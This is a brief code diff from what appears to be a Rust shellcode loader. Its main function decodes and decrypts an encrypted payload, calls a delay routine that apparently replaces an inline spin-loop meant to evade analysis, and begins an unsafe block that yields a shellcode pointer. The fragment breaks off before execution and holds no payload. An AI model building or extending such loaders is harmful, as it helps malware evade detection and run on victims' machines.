@@ -81,8 +81,7 @@ fn main() {
 
     let decrypted_data = decode_payload(&encrypted_data).unwrap();
 
-    #[cfg(not(feature = "debug"))]
-    for _ in 0..1000000 { core::hint::spin_loop(); }
+    utils::delay_loop();
 
     unsafe {
         let (shellcode_ptr, shellcode_len) = match decrypt(&decrypted_data) {
